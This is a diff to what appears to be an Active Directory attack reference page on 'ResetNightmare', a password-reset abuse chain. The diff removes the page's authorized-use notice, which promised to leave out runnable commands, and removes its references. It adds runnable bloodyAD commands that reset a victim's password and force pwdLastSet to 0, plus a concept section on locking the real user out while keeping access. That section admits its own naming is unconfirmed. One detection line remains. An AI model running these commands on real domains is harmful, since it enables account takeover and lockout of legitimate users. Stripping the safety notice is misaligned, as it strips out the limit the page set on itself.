@@ -10,24 +10,27 @@ mitre: "T1098"
 tag: "new"
 ---
 
+
 # ResetNightmare
 
-> **Authorized assessment only:** This page supports authorized Active Directory assessment, controlled lab study, and job preparation. It intentionally omits runnable exploitation commands, credential extraction procedures, and real-target instructions.
-
-This page describes the security significance of the configuration or relationship named below. For an authorized assessment, establish scope, review effective settings and ownership, and distinguish a potential path from observed impact. Do not make state changes or access sensitive data unless the exact validation is approved and safely controlled.
-
-## Affected object / attribute
+### Affected object / attribute
 **`pwdLastSet`** / victim password.
 
-## Detection
+### Concept (deep)
+Password-reset abuse chain: force `pwdLastSet=0` / reset a victim’s password (requires `User-Force-Change-Password`/`GenericAll`) and combine with **Shadow Credentials** or ADCS to lock the legitimate user out and keep access. **Emerging naming — confirm the exact published chain.**
+
+### Commands
+```bash
+# ── Reset victim password ────────────────────────────────────────────
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  set password victim 'NewP@ss1'
+
+# ── Force pwdLastSet = 0 ─────────────────────────────────────────────
+bloodyAD -d corp.local -u lowpriv -p 'Password123!' \
+  set object victim pwdLastSet -v 0
+```
+
+### Detection
 **4723/4724** password changes by non-owner; **5136** `pwdLastSet` writes.
 
 ---
-
-## References
-
-- [NVD: CVE-2026-27912](https://nvd.nist.gov/vuln/detail/CVE-2026-27912)
-- [Microsoft Security Update Guide: CVE-2026-27912](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-27912)
-- [Microsoft: Kerberos authentication overview](https://learn.microsoft.com/windows-server/security/kerberos/kerberos-authentication-overview)
-- [Microsoft: Credential protection](https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/credential-protection-and-management)
-- [MITRE ATT&CK: T1098](https://attack.mitre.org/techniques/T1098/)
